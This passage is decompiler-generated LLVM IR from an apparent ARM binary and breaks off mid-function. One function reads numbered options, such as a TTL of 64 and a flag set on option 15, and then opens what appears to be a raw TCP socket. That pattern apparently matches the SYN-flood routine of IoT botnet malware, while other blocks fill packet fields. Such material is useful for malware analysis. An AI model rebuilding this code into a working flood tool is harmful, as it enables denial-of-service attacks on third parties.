  store i32 %v3_bcf0, i32* %r2.global-to-local, align 4
  %v9_bfa8 = icmp eq i32 %v3_bcf0, %v1_bfa8
  store i1 %v9_bfa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bfa8, label %dec_label_pc_c108, label %dec_label_pc_bfb0

dec_label_pc_bfb0:                                ; preds = %dec_label_pc_c0f4.dec_label_pc_bfb0_crit_edge, %dec_label_pc_bfa4
  %v1_bfb4 = phi i32 [ %v1_bfb4.pre, %dec_label_pc_c0f4.dec_label_pc_bfb0_crit_edge ], [ %v1_bfa8, %dec_label_pc_bfa4 ]
  store i32 %v3_bcf4, i32* %r3.global-to-local, align 4
  %v9_bfb4 = icmp eq i32 %v3_bcf4, %v1_bfb4
  store i1 %v9_bfb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bfb4, label %dec_label_pc_c11c, label %dec_label_pc_bfbc

dec_label_pc_bfbc:                                ; preds = %dec_label_pc_c108.dec_label_pc_bfbc_crit_edge, %dec_label_pc_bfb0
  %v1_bfc0 = phi i32 [ %v1_bfc0.pre, %dec_label_pc_c108.dec_label_pc_bfbc_crit_edge ], [ %v1_bfb4, %dec_label_pc_bfb0 ]
  store i32 %v5_bb90, i32* %ip.global-to-local, align 4
  %v9_bfc0 = icmp eq i32 %v5_bb90, %v1_bfc0
  store i1 %v9_bfc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bfc0, label %dec_label_pc_c130, label %dec_label_pc_bfc8

dec_label_pc_bfc8:                                ; preds = %dec_label_pc_c11c.dec_label_pc_bfc8_crit_edge, %dec_label_pc_bfbc
  %v1_bfcc = phi i32 [ %v1_bfcc.pre, %dec_label_pc_c11c.dec_label_pc_bfc8_crit_edge ], [ %v1_bfc0, %dec_label_pc_bfbc ]
  store i32 %v6_bbac, i32* %r0.global-to-local, align 4
  %v9_bfcc = icmp eq i32 %v6_bbac, %v1_bfcc
  store i1 %v9_bfcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bfcc, label %dec_label_pc_c144, label %dec_label_pc_bfd4

dec_label_pc_bfd4:                                ; preds = %dec_label_pc_c130, %dec_label_pc_bfc8
  store i32 %v1_bc7c, i32* %r1.global-to-local, align 4
  store i1 %v2_c14c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c14c, label %dec_label_pc_bfe0, label %dec_label_pc_c158

dec_label_pc_bfe0:                                ; preds = %dec_label_pc_bfd4, %dec_label_pc_c144, %dec_label_pc_c158
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_bfe4 = load i32, i32* @r5, align 4
  %v3_bfe4 = add i32 %v2_bfe4, 10
  %v4_bfe4 = inttoptr i32 %v3_bfe4 to i16*
  store i16 0, i16* %v4_bfe4, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_bfec = load i32, i32* @r5, align 4
  store i32 %v0_bfec, i32* @r0, align 4
  %v2_bff0 = call i32 @function_c848(i32 %v0_bfec, i32 20)
  %v3_bff0 = trunc i32 %v2_bff0 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_bff8 = load i32, i32* @r5, align 4
  %v4_bff8 = add i32 %v3_bff8, 10
  %v5_bff8 = inttoptr i32 %v4_bff8 to i16*
  store i16 %v3_bff0, i16* %v5_bff8, align 2
  %v0_bffc = load i32, i32* @r6, align 4
  store i32 %v0_bffc, i32* @r1, align 4
  %v0_c000 = load i32, i32* %r3.global-to-local, align 4
  %v1_c000 = trunc i32 %v0_c000 to i16
  %v3_c000 = add i32 %v0_bffc, 16
  %v4_c000 = inttoptr i32 %v3_c000 to i16*
  store i16 %v1_c000, i16* %v4_c000, align 2
  %v0_c004 = load i32, i32* @sl, align 4
  store i32 %v0_c004, i32* %r2.global-to-local, align 4
  %v0_c008 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_c008, i32* %r3.global-to-local, align 4
  %v0_c00c = load i32, i32* @r5, align 4
  store i32 %v0_c00c, i32* %r0.global-to-local, align 4
  %v4_c010 = call i32 @function_c898(i32 %v0_c00c, i32 %v0_bffc, i32 %v0_c004, i32 %v0_c008)
  %v5_c010 = trunc i32 %v4_c010 to i16
  store i32 %v4_c010, i32* %r0.global-to-local, align 4
  %v3_c014 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c014, i32* %r3.global-to-local, align 4
  %v3_c018 = mul i32 %v3_c014, 32
  store i32 %v3_c018, i32* %lr.global-to-local, align 4
  %v3_c01c = load i32, i32* @r6, align 4
  %v4_c01c = add i32 %v3_c01c, 16
  %v5_c01c = inttoptr i32 %v4_c01c to i16*
  store i16 %v5_c010, i16* %v5_c01c, align 2
  %v0_c020 = load i32, i32* %lr.global-to-local, align 4
  %v1_c020 = load i32, i32* %r3.global-to-local, align 4
  %tmp78 = mul i32 %v1_c020, -8
  %v5_c020 = add i32 %v0_c020, %tmp78
  store i32 %v5_c020, i32* %lr.global-to-local, align 4
  %v0_c024 = load i32, i32* @r6, align 4
  %v1_c024 = add i32 %v0_c024, 2
  %v2_c024 = inttoptr i32 %v1_c024 to i16*
  %v3_c024 = load i16, i16* %v2_c024, align 2
  %v1_c028 = load i32, i32* @r8, align 4
  %v2_c028 = add i32 %v1_c028, %v5_c020
  store i32 %v2_c028, i32* @lr, align 4
  %v3_c02c = add i32 %v2_c028, 2
  %v4_c02c = inttoptr i32 %v3_c02c to i16*
  store i16 %v3_c024, i16* %v4_c02c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_c038 = load i32, i32* @r5, align 4
  store i32 %v0_c038, i32* %r1.global-to-local, align 4
  store i32 %v3_bca4, i32* %r0.global-to-local, align 4
  %v0_c040 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_c040, i32* %r2.global-to-local, align 4
  %v0_c044 = load i32, i32* @lr, align 4
  %v6_c04c = call i32 @function_11a68(i32 %v3_bca4, i32 %v0_c038, i32 %v0_c040, i32 16384, i32 %v0_c044, i32 16)
  %v3_c050 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c050, i32* %r3.global-to-local, align 4
  %v1_c054 = add i32 %v3_c050, 1
  store i32 %v1_c054, i32* %r0.global-to-local, align 4
  %v1_c058 = load i32, i32* @r7, align 4
  %v9_c058 = icmp eq i32 %v1_c054, %v1_c058
  store i1 %v9_c058, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c054, i32* %stack_var_-44, align 4
  %v5_c060 = icmp slt i32 %v1_c054, %v1_c058
  br i1 %v5_c060, label %dec_label_pc_bf60, label %dec_label_pc_c064

dec_label_pc_c064:                                ; preds = %dec_label_pc_bfe0
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c068 = icmp eq i32 %v1_c058, 0
  store i1 %v2_c068, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c068, label %dec_label_pc_bf4c, label %dec_label_pc_bf5c

dec_label_pc_c078:                                ; preds = %dec_label_pc_bf60
  %v1_c078 = add i32 %v2_bf68, 16
  %v2_c078 = inttoptr i32 %v1_c078 to i32*
  %v3_c078 = load i32, i32* %v2_c078, align 4
  %v0_c07c = call i32 @function_e0d0()
  store i32 %v0_c07c, i32* %r0.global-to-local, align 4
  %v3_c080 = load i32, i32* %stack_var_-44, align 4
  %v5_c088 = mul i32 %v3_c080, 24
  %v1_c08c = and i32 %v3_c078, 16711680
  store i32 %v1_c08c, i32* %ip.global-to-local, align 4
  %v3_c090 = udiv i32 %v3_c078, 16777216
  %v4_c094 = udiv i32 %v1_c08c, 256
  %v5_c094 = or i32 %v4_c094, %v3_c090
  store i32 %v5_c094, i32* %r2.global-to-local, align 4
  %v1_c098 = load i32, i32* @r8, align 4
  %v2_c098 = add i32 %v1_c098, %v5_c088
  store i32 %v2_c098, i32* %r1.global-to-local, align 4
  %v1_c09c = and i32 %v3_c078, 65280
  store i32 %v1_c09c, i32* %r3.global-to-local, align 4
  %v1_c0a0 = add i32 %v2_c098, 20
  %v2_c0a0 = inttoptr i32 %v1_c0a0 to i8*
  %v3_c0a0 = load i8, i8* %v2_c0a0, align 1
  %v4_c0a0 = zext i8 %v3_c0a0 to i32
  store i32 %v4_c0a0, i32* %ip.global-to-local, align 4
  %v5_c0a8 = call i32 @llvm.bswap.i32(i32 %v3_c078)
  %v7_c0ac = lshr i32 %v0_c07c, %v4_c0a0
  %v8_c0ac = add i32 %v7_c0ac, %v5_c0a8
  store i32 %v8_c0ac, i32* %r2.global-to-local, align 4
  %v1_c0bc = and i32 %v8_c0ac, 65280
  store i32 %v1_c0bc, i32* %r1.global-to-local, align 4
  store i32 %v6_bc90, i32* %r0.global-to-local, align 4
  %v5_c0c8 = call i32 @llvm.bswap.i32(i32 %v8_c0ac)
  store i32 %v5_c0c8, i32* %r3.global-to-local, align 4
  store i1 %v7_bf88, i1* %cpsr_z.global-to-local, align 1
  %v1_c0d0 = load i32, i32* @r5, align 4
  %v2_c0d0 = add i32 %v1_c0d0, 16
  %v3_c0d0 = inttoptr i32 %v2_c0d0 to i32*
  store i32 %v5_c0c8, i32* %v3_c0d0, align 4
  br i1 %v2_bf88, label %dec_label_pc_c0d8, label %dec_label_pc_bf90

dec_label_pc_c0d8:                                ; preds = %dec_label_pc_c078, %dec_label_pc_bf84
  %v0_c0d8 = call i32 @function_e0d0()
  store i32 %v0_c0d8, i32* %r0.global-to-local, align 4
  store i32 %v3_bcec, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c0e8, i1* %cpsr_z.global-to-local, align 1
  %v1_c0ec = load i32, i32* @r5, align 4
  %v2_c0ec = add i32 %v1_c0ec, 12
  %v3_c0ec = inttoptr i32 %v2_c0ec to i32*
  store i32 %v0_c0d8, i32* %v3_c0ec, align 4
  br i1 %v3_c0e8, label %dec_label_pc_c0f4, label %dec_label_pc_c0d8.dec_label_pc_bfa4_crit_edge

dec_label_pc_c0d8.dec_label_pc_bfa4_crit_edge:    ; preds = %dec_label_pc_c0d8
  %v1_bfa8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bfa4

dec_label_pc_c0f4:                                ; preds = %dec_label_pc_c0d8, %dec_label_pc_bf90
  %v0_c0f4 = call i32 @function_e0d0()
  %v1_c0f4 = trunc i32 %v0_c0f4 to i16
  store i32 %v0_c0f4, i32* %r0.global-to-local, align 4
  store i32 %v3_bcf0, i32* %r2.global-to-local, align 4
  %v1_c0fc = load i32, i32* @r4, align 4
  %v9_c0fc = icmp eq i32 %v3_bcf0, %v1_c0fc
  store i1 %v9_c0fc, i1* %cpsr_z.global-to-local, align 1
  %v3_c100 = load i32, i32* @r5, align 4
  %v4_c100 = add i32 %v3_c100, 4
  %v5_c100 = inttoptr i32 %v4_c100 to i16*
  store i16 %v1_c0f4, i16* %v5_c100, align 2
  br i1 %v9_c0fc, label %dec_label_pc_c108, label %dec_label_pc_c0f4.dec_label_pc_bfb0_crit_edge

dec_label_pc_c0f4.dec_label_pc_bfb0_crit_edge:    ; preds = %dec_label_pc_c0f4
  %v1_bfb4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bfb0

dec_label_pc_c108:                                ; preds = %dec_label_pc_c0f4, %dec_label_pc_bfa4
  %v0_c108 = call i32 @function_e0d0()
  %v1_c108 = trunc i32 %v0_c108 to i16
  store i32 %v0_c108, i32* %r0.global-to-local, align 4
  store i32 %v3_bcf4, i32* %r3.global-to-local, align 4
  %v1_c110 = load i32, i32* @r4, align 4
  %v9_c110 = icmp eq i32 %v3_bcf4, %v1_c110
  store i1 %v9_c110, i1* %cpsr_z.global-to-local, align 1
  %v3_c114 = load i32, i32* @r5, align 4
  %v4_c114 = add i32 %v3_c114, 20
  %v5_c114 = inttoptr i32 %v4_c114 to i16*
  store i16 %v1_c108, i16* %v5_c114, align 2
  br i1 %v9_c110, label %dec_label_pc_c11c, label %dec_label_pc_c108.dec_label_pc_bfbc_crit_edge

dec_label_pc_c108.dec_label_pc_bfbc_crit_edge:    ; preds = %dec_label_pc_c108
  %v1_bfc0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bfbc

dec_label_pc_c11c:                                ; preds = %dec_label_pc_c108, %dec_label_pc_bfb0
  %v0_c11c = call i32 @function_e0d0()
  %v1_c11c = trunc i32 %v0_c11c to i16
  store i32 %v0_c11c, i32* %r0.global-to-local, align 4
  store i32 %v5_bb90, i32* %ip.global-to-local, align 4
  %v1_c124 = load i32, i32* @r4, align 4
  %v9_c124 = icmp eq i32 %v5_bb90, %v1_c124
  store i1 %v9_c124, i1* %cpsr_z.global-to-local, align 1
  %v3_c128 = load i32, i32* @r6, align 4
  %v4_c128 = add i32 %v3_c128, 2
  %v5_c128 = inttoptr i32 %v4_c128 to i16*
  store i16 %v1_c11c, i16* %v5_c128, align 2
  br i1 %v9_c124, label %dec_label_pc_c130, label %dec_label_pc_c11c.dec_label_pc_bfc8_crit_edge

dec_label_pc_c11c.dec_label_pc_bfc8_crit_edge:    ; preds = %dec_label_pc_c11c
  %v1_bfcc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bfc8

dec_label_pc_c130:                                ; preds = %dec_label_pc_c11c, %dec_label_pc_bfbc
  %v0_c130 = call i32 @function_e0d0()
  %v1_c134 = load i32, i32* @r6, align 4
  %v2_c134 = add i32 %v1_c134, 4
  %v3_c134 = inttoptr i32 %v2_c134 to i32*
  store i32 %v0_c130, i32* %v3_c134, align 4
  store i32 %v6_bbac, i32* %r0.global-to-local, align 4
  %v1_c13c = load i32, i32* @r4, align 4
  %v9_c13c = icmp eq i32 %v6_bbac, %v1_c13c
  store i1 %v9_c13c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c13c, label %dec_label_pc_c144, label %dec_label_pc_bfd4

dec_label_pc_c144:                                ; preds = %dec_label_pc_c130, %dec_label_pc_bfc8
  %v0_c144 = call i32 @function_e0d0()
  store i32 %v0_c144, i32* %r0.global-to-local, align 4
  store i32 %v1_bc7c, i32* %r1.global-to-local, align 4
  store i1 %v2_c14c, i1* %cpsr_z.global-to-local, align 1
  %v1_c150 = load i32, i32* @r6, align 4
  %v2_c150 = add i32 %v1_c150, 8
  %v3_c150 = inttoptr i32 %v2_c150 to i32*
  store i32 %v0_c144, i32* %v3_c150, align 4
  br i1 %v2_c14c, label %dec_label_pc_bfe0, label %dec_label_pc_c158

dec_label_pc_c158:                                ; preds = %dec_label_pc_bfd4, %dec_label_pc_c144
  %v0_c158 = load i32, i32* @r5, align 4
  %v1_c158 = add i32 %v0_c158, 40
  store i32 %v1_c158, i32* %r0.global-to-local, align 4
  store i32 %v6_bc54, i32* %r1.global-to-local, align 4
  %v2_c160 = inttoptr i32 %v1_c158 to i16*
  %v3_c160 = call i32 @function_e264(i16* %v2_c160, i32 %v6_bc54)
  store i32 %v3_c160, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bfe0

dec_label_pc_c168:                                ; preds = %dec_label_pc_bcb4
  store i32 %v3_bca4, i32* %r0.global-to-local, align 4
  %v1_c16c = call i32 @function_1130c(i32 %v3_bca4)
  store i32 %v1_c16c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c170

dec_label_pc_c170:                                ; preds = %dec_label_pc_baa4, %dec_label_pc_c168
  %v1_c178 = phi i32 [ %v3_bca4, %dec_label_pc_baa4 ], [ %v1_c16c, %dec_label_pc_c168 ]
  store i32 %v18_baa4, i32* %sb.global-to-local, align 4
  store i32 %v24_baa4, i32* %fp.global-to-local, align 4
  store i32 %v27_baa4, i32* %lr.global-to-local, align 4
  ret i32 %v1_c178

dec_label_pc_c17c:                                ; preds = %dec_label_pc_bcdc
  store i32 %v6_bc54, i32* %r0.global-to-local, align 4
  %v1_c184 = add i32 %v6_bc54, 20
  store i32 %v1_c184, i32* %sb.global-to-local, align 4
  %v3_c188 = mul i32 %v6_bc54, 65536
  store i32 %v3_c188, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_bf38

; uselistorder directives
  uselistorder i32 %v0_c11c, { 1, 0 }
  uselistorder i32 %v0_c108, { 1, 0 }
  uselistorder i32 %v0_c0f4, { 1, 0 }
  uselistorder i32 %v5_c0c8, { 1, 0 }
  uselistorder i32 %v3_c078, { 2, 1, 3, 0 }
  uselistorder i32 %v1_c054, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_c020, { 1, 0 }
  uselistorder i32 %v4_c010, { 1, 0 }
  uselistorder i1 %v7_bf88, { 2, 1, 0 }
  uselistorder i1 %v2_c14c, { 2, 3, 1, 0 }
  uselistorder i1 %v3_c0e8, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-140.0, { 1, 0 }
  uselistorder i32 %v1_bf1c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_bef0, { 1, 0 }
  uselistorder i32 %v1_bda4, { 1, 2, 0 }
  uselistorder i32 %v1_bda0, { 2, 1, 0 }
  uselistorder i32 %v1_bd9c, { 2, 0, 1 }
  uselistorder i32 %v1_bd98, { 2, 0, 1 }
  uselistorder i32 %v1_bd94, { 2, 0, 1 }
  uselistorder i32 %v1_bd6c, { 1, 0 }
  uselistorder i32 %v3_bd14, { 1, 0 }
  uselistorder i32 %v3_bcec, { 0, 1, 3, 2 }
  uselistorder i32 %v0_bce4, { 1, 0, 2 }
  uselistorder i32 %v0_bce0, { 1, 0, 2 }
  uselistorder i32 %v0_bcdc, { 1, 0, 3, 2 }
  uselistorder i1 %v7_bcd4, { 1, 0 }
  uselistorder i1 %v7_bca8, { 1, 0 }
  uselistorder i32 %v3_bca4, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_bc90, { 5, 3, 0, 4, 2, 1 }
  uselistorder i32 %v1_bc7c, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_bc54, { 0, 10, 9, 8, 7, 2, 4, 3, 6, 5, 1 }
  uselistorder i32 %v6_bbac, { 3, 2, 1, 0 }
  uselistorder i32 %v5_bb90, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_bb40, { 1, 0 }
  uselistorder i32 %v2_bac0, { 0, 4, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 37, 36, 39, 38, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 6, 4, 7, 5, 8, 9, 10, 12, 11, 14, 13, 15, 17, 16, 18, 19, 20, 22, 21, 27, 23, 24, 25, 26, 31, 28, 29, 30, 32, 34, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i16 64, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c170, { 1, 0 }
  uselistorder label %dec_label_pc_c158, { 1, 0 }
  uselistorder label %dec_label_pc_bfe0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_bf5c, { 1, 0 }
  uselistorder label %dec_label_pc_bf4c, { 1, 0, 2 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_c19c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_c19c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_c19c = load i32, i32* @r4, align 4
  %v24_c19c = load i32, i32* @fp, align 4
  %v27_c19c = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_c1b8 = call i32 @function_12654(i32 %arg1, i32 4)
  %v0_c1bc = load i32, i32* @r5, align 4
  store i32 %v0_c1bc, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_c1b8, i32* @sb, align 4
  %v0_c1cc = load i32, i32* @r4, align 4
  store i32 %v0_c1cc, i32* %r0.global-to-local, align 4
  %v4_c1d0 = inttoptr i32 %v0_c1bc to i32*
  %v5_c1d0 = call i32 @function_8570(i32 %v0_c1cc, i32* %v4_c1d0, i32 2, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c1e8 = load i32, i32* @r5, align 4
  store i32 %v0_c1e8, i32* %r1.global-to-local, align 4
  %v0_c1ec = load i32, i32* @r4, align 4
  store i32 %v0_c1ec, i32* %r0.global-to-local, align 4
  %v5_c1f0 = trunc i32 %v5_c1d0 to i8
  %v6_c1f4 = inttoptr i32 %v0_c1e8 to i32*
  %v7_c1f4 = call i32 @function_8570(i32 %v0_c1ec, i32* %v6_c1f4, i32 3, i32 65535)
  %v0_c1f8 = load i32, i32* @r5, align 4
  store i32 %v0_c1f8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_c208 = load i32, i32* @r4, align 4
  store i32 %v0_c208, i32* %r0.global-to-local, align 4
  %v5_c20c = inttoptr i32 %v0_c1f8 to i32*
  %v6_c20c = call i32 @function_8570(i32 %v0_c208, i32* %v5_c20c, i32 4, i32 64)
  %v1_c214 = urem i32 %v6_c20c, 256
  %v0_c218 = load i32, i32* @r5, align 4
  store i32 %v0_c218, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c224 = load i32, i32* @r4, align 4
  store i32 %v0_c224, i32* %r0.global-to-local, align 4
  %v6_c22c = inttoptr i32 %v0_c218 to i32*
  %v7_c22c = call i32 @function_8570(i32 %v0_c224, i32* %v6_c22c, i32 5, i32 1)
  %v1_c238 = urem i32 %v7_c22c, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c244 = load i32, i32* @r5, align 4
  store i32 %v0_c244, i32* %r1.global-to-local, align 4
  %v0_c248 = load i32, i32* @r4, align 4
  store i32 %v0_c248, i32* %r0.global-to-local, align 4
  %v5_c250 = inttoptr i32 %v0_c244 to i32*
  %v6_c250 = call i32 @function_8570(i32 %v0_c248, i32* %v5_c250, i32 6, i32 65535)
  %v0_c258 = load i32, i32* @r5, align 4
  store i32 %v0_c258, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_c250, i32* %fp.global-to-local, align 4
  %v0_c268 = load i32, i32* @r4, align 4
  store i32 %v0_c268, i32* %r0.global-to-local, align 4
  %v4_c26c = inttoptr i32 %v0_c258 to i32*
  %v5_c26c = call i32 @function_8570(i32 %v0_c268, i32* %v4_c26c, i32 7, i32 65535)
  %v0_c274 = load i32, i32* @r5, align 4
  store i32 %v0_c274, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_c26c, i32* @r6, align 4
  %v0_c284 = load i32, i32* @r4, align 4
  store i32 %v0_c284, i32* %r0.global-to-local, align 4
  %v4_c288 = inttoptr i32 %v0_c274 to i32*
  %v5_c288 = call i32 @function_8570(i32 %v0_c284, i32* %v4_c288, i32 17, i32 65535)
  %v0_c28c = load i32, i32* @r5, align 4
  store i32 %v0_c28c, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c29c = load i32, i32* @r4, align 4
  store i32 %v0_c29c, i32* %r0.global-to-local, align 4
  %v5_c2a0 = inttoptr i32 %v0_c28c to i32*
  %v6_c2a0 = call i32 @function_8570(i32 %v0_c29c, i32* %v5_c2a0, i32 18, i32 0)
  %v0_c2a4 = load i32, i32* @r5, align 4
  store i32 %v0_c2a4, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c2b4 = load i32, i32* @r4, align 4
  store i32 %v0_c2b4, i32* %r0.global-to-local, align 4
  %v5_c2b8 = inttoptr i32 %v0_c2a4 to i32*
  %v6_c2b8 = call i32 @function_8570(i32 %v0_c2b4, i32* %v5_c2b8, i32 11, i32 0)
  %v0_c2bc = load i32, i32* @r5, align 4
  store i32 %v0_c2bc, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c2cc = load i32, i32* @r4, align 4
  store i32 %v0_c2cc, i32* %r0.global-to-local, align 4
  %v5_c2d0 = inttoptr i32 %v0_c2bc to i32*
  %v6_c2d0 = call i32 @function_8570(i32 %v0_c2cc, i32* %v5_c2d0, i32 12, i32 0)
  %v0_c2d4 = load i32, i32* @r5, align 4
  store i32 %v0_c2d4, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c2e4 = load i32, i32* @r4, align 4
  store i32 %v0_c2e4, i32* %r0.global-to-local, align 4
  %v5_c2e8 = inttoptr i32 %v0_c2d4 to i32*
  %v6_c2e8 = call i32 @function_8570(i32 %v0_c2e4, i32* %v5_c2e8, i32 13, i32 0)
  %v0_c2ec = load i32, i32* @r5, align 4
  store i32 %v0_c2ec, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c2fc = load i32, i32* @r4, align 4
  store i32 %v0_c2fc, i32* %r0.global-to-local, align 4
  %v5_c300 = inttoptr i32 %v0_c2ec to i32*
  %v6_c300 = call i32 @function_8570(i32 %v0_c2fc, i32* %v5_c300, i32 14, i32 0)
  %v0_c304 = load i32, i32* @r5, align 4
  store i32 %v0_c304, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c314 = load i32, i32* @r4, align 4
  store i32 %v0_c314, i32* %r0.global-to-local, align 4
  %v5_c318 = inttoptr i32 %v0_c304 to i32*
  %v6_c318 = call i32 @function_8570(i32 %v0_c314, i32* %v5_c318, i32 15, i32 1)
  %v0_c31c = load i32, i32* @r5, align 4
  store i32 %v0_c31c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c32c = load i32, i32* @r4, align 4
  store i32 %v0_c32c, i32* %r0.global-to-local, align 4
  %v5_c330 = inttoptr i32 %v0_c31c to i32*
  %v6_c330 = call i32 @function_8570(i32 %v0_c32c, i32* %v5_c330, i32 16, i32 0)
  %v2_c33c = load i32, i32* @global_var_212d8.45, align 4
  store i32 %v2_c33c, i32* %r3.global-to-local, align 4
  %v0_c340 = load i32, i32* @r5, align 4
  store i32 %v0_c340, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_c348 = load i32, i32* @r4, align 4
  store i32 %v0_c348, i32* %r0.global-to-local, align 4
  %v5_c34c = inttoptr i32 %v0_c340 to i32*
  %v6_c34c = call i32 @function_8504(i32 %v0_c348, i32* %v5_c34c, i32 25, i32 %v2_c33c, i32 %v6_c330)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_c360 = call i32 @function_11aec(i32 2, i32 3, i32 6)
  store i32 %v3_c360, i32* %r0.global-to-local, align 4
  %v7_c364 = icmp eq i32 %v3_c360, -1
  store i1 %v7_c364, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_c360, i32* @sl, align 4
  br i1 %v7_c364, label %dec_label_pc_c838, label %dec_label_pc_c370

dec_label_pc_c370:                                ; preds = %dec_label_pc_c19c
  store i32 1, i32* %stack_var_-44, align 4
  %v6_c378 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_c378, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
